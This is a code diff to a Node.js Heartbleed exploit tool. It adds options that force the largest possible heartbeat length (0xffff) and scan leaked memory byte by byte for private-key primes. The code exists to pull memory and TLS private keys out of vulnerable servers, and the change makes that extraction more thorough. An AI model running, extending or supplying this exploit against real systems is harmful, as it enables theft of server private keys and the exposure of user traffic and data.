@@ -13,6 +13,8 @@ var argv = require('yargs')
     .alias('h', 'host')
     .alias('p', 'port')
     .alias('c', 'concurrency')
+    .alias('r', 'random')
+    .alias('s', 'seq')
     .default('port', 443)
     .default('concurrency', 1)
     .argv;
@@ -78,7 +80,10 @@ function heartbleed(ip, port, host) {
     function send() {
       acc = [];
       total = 0;
-      sent = (Math.random() * 65535) | 1;
+      if (argv.random)
+        sent = (Math.random() * 65535) | 1;
+      else
+        sent = 0xffff;
       s.sslWrap.setHeartbeatLength(sent);
       s.pair.ssl.isSessionReused();
     }
@@ -111,7 +116,8 @@ function heartbleed(ip, port, host) {
 
 function test(chunk) {
   var size = primeSize;
-  for (var i = 0; i < chunk.length - size - 1; i += 8) {
+  var delta = argv.seq ? 1 : 8;
+  for (var i = 0; i < chunk.length - size - 1; i += delta) {
     // Ignore even numbers, and ones that are not terminating with `0`
     if (chunk[i] % 2 === 0 || chunk[i + size] !== 0)
       continue;
